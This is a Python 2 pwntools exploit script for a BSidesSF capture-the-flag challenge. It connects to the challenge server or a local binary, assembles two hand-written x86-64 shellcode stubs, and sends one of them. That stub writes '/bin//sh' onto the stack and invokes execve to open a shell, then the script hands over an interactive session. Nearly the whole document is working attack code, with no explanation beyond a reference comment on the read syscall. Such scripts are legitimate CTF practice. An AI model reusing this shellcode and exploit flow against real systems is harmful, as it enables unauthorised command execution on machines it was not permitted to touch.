#!/usr/bin/python2
# -*- coding: utf-8 -*-
from pwn import *

context.terminal = ['kitty', '-e', 'sh', '-c']
exe = context.binary = ELF('./chall')

host = args.HOST or 'runme-bc63cb99.challenges.bsidessf.net'
port = int(args.PORT or 1337)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak *main
continue
'''.format(**locals())

io = start()
context.arch = "x86_64"
lmao = asm("""
    push 0x30
    pop rax
    xor al, 0x30
    push rax
    pop rdx
    dec rax
    dec rdx
    xor ax, 0x4f73;
    xor ax, 0x3041;
    pop rcx;
    pop rcx;
    dec rcx;
    dec rcx;
    dec rcx;
    push 0x47;
    pop rdi;
    xor 0x42[rcx], di
    xor 0x43[rcx], di
    xor 0x44[rcx], di
    xor 0x45[rcx], di
    xor 0x46[rcx], di
    xor 0x42[rcx], ax
    push    0x41
    pop    rax
    xor    al, 0x42
    inc rdi;
    inc rdi;
    inc rdi;
    inc rdi;
    inc rdi;
    inc rdi;
    inc rdi;
    inc rdi;
    inc rdi;
    inc rdi;
    inc rdi;
    inc rdi;
    inc rdi;
    inc rdi;
    inc rdi;
    inc rdi;
    inc rdi;
    inc rdi;
    inc rdi;
    inc rdi;
    inc rdi;
    inc rdi;
""")

ape = asm("""
  nop
  xor rdx, rdx
  xor rdi, rdi
  pop rdx;
  push 0x3030474a
  pop rax
  push 0x30304245
  pop rcx
  xor rcx, rax
  xor rax, rax
  mov 0x3f[rsi], rcx
  mov rdx, 0x68732f2f6e69622f
  push rdx
  mov qword ptr[rsi+0x69], rdx
  mov rdi, rsi
  add rdi, 0x69
  push 0x3b
  pop rax
  xor rsi, rsi
  xor rdx, rdx
  nop
  nop
  nop

""")
"""
Name            : read
rax             : 0x00
rdi             : unsigned int fd
rsi             : char *buf
rdx             : size_t count
rcx             : -
r8              : -
r9              : -
Definition      : fs/read_write.c
"""
print(ape)
io.recvline()
io.send(ape)

io.interactive()